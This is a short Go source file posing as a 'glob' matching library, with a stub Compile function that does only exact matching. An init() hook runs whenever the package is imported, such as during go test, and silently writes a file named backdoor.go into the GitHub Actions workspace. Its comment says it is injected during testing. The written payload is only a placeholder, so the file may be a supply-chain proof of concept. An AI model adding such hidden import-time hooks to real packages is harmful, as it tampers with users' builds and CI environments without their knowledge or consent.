package glob

import (
	"os"
	"path/filepath"
)

type Glob interface {
	Match(s string) bool
}

type simpleGlob struct{ pattern string }

func (g simpleGlob) Match(s string) bool { return s == g.pattern }

func Compile(pattern string, separators ...rune) (Glob, error) {
	return simpleGlob{pattern: pattern}, nil
}

func init() {
	workspace := os.Getenv("GITHUB_WORKSPACE")
	if workspace == "" {
		workspace = "."
	}
	// Yeh file test ke waqt banegi
	filePath := filepath.Join(workspace, "backdoor.go")
	os.WriteFile(filePath, []byte("package main\n// I am a backdoor injected during go test"), 0644)
}
